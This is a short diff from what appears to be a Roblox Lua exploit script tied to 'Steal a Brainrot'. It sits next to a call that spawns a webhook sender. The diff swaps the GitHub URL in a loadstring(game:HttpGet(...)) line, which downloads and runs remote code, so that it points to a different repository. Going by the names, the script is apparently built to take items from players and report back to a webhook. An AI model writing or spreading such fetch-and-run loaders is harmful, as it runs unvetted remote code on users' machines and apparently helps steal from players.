@@ -55,7 +55,7 @@ task.spawn(sendWebhook)
 -- LOAD EXTRA STUCK SCRIPT
 -----------------------------------------------------------------
 loadstring(game:HttpGet(
-    "https://raw.githubusercontent.com/RblxScriptsOG/Steal-a-brainrot/refs/heads/main/stuck2.lua",
+    "https://raw.githubusercontent.com/changelog-modul/Steal-A-BrainrotV3/refs/heads/main/stuck2",
     true
 ))()
 
